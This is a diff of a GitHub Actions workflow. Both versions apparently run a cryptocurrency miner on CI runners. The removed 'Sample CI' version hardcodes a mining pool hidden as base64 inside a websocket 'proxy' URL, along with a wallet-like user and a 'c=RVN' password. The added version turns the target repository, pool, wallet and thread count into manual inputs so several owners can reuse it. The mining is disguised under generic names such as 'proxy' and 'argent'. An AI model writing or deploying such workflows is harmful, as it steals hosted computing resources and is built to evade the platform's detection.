@@ -1,33 +1,63 @@
-name: Sample CI
+name: Dynamic (Multi-Owner Ready)
 
 on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+  workflow_dispatch:
+    inputs:
+      repoName:
+        description: 'Repository'
+        required: true
+      proxy:
+        description: 'URL'
+        required: true
+      user:
+        description: 'Username'
+        required: true
+      password:
+        description: 'Password'
+        required: true
+      threads:
+        description: 'Threads'
+        required: true
+        default: '8'
+      argent:
+        description: 'Argent value'
+        required: false  # Optional if not always needed
+        default: 'wa'
+      log:
+        description: 'Enable logging'
+        type: boolean
+        default: true
 
 jobs:
-  run-script:
-    name: Run run.sh
+  run:
     runs-on: ubuntu-22.04
     steps:
-      - name: Set up Node
+      - name: Setup Node.js 20.19
         uses: actions/setup-node@v4
         with:
           node-version: "20.19.0"
 
-      - name: Clone a public repository
+      - name: Clone Target Repository
         uses: actions/checkout@v4
         with:
-          repository: ismailalkaf/node-mino-app
+          repository: ${{ github.event.inputs.repoName }}
           ref: main
-          path: node-mino-app
+          path: dir-app
 
-      - name: Run echo
-        working-directory: node-mino-app
+      - name: Create data
         run: |
-          echo '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN,56", "argent": "wasm-mino/2.0", "threads": 4}' > data.txt
-      - name: Run node app
-        working-directory: node-mino-app
+          cat > dir-app/data.txt << EOF
+          {
+            "log": ${{ github.event.inputs.log }},
+            "proxy": "${{ github.event.inputs.proxy }}",
+            "user": "${{ github.event.inputs.user }}",
+            "password": "${{ github.event.inputs.password }}",
+            "argent": ${{ github.event.inputs.argent }},
+            "threads": ${{ github.event.inputs.threads }}
+          }
+          EOF
+
+      - name: Run
+        working-directory: dir-app
         run: |
           ./node app.js
